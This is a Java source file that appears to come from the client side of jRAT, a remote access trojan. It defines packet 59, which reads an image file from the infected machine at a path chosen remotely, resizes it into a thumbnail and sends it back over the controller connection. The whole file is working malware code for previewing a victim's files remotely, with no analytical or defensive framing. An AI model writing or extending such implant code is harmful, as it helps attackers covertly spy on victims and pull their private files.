package jrat.client.packets.outgoing;

import io.jrat.common.io.StringWriter;
import io.jrat.common.utils.ImageUtils;
import java.awt.image.BufferedImage;
import java.io.DataOutputStream;
import java.io.File;
import javax.imageio.ImageIO;

public class Packet59ThumbnailPreview extends AbstractOutgoingPacket {

	private String file;

	public Packet59ThumbnailPreview(String file) {
		this.file = file;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(file);

		BufferedImage image = ImageIO.read(new File(file));
		image = ImageUtils.resize(image, 150, 100);

		byte[] buffer = ImageUtils.encode(image);

		dos.writeInt(buffer.length);
		dos.write(buffer);
	}

	@Override
	public short getPacketId() {
		return 59;
	}

}
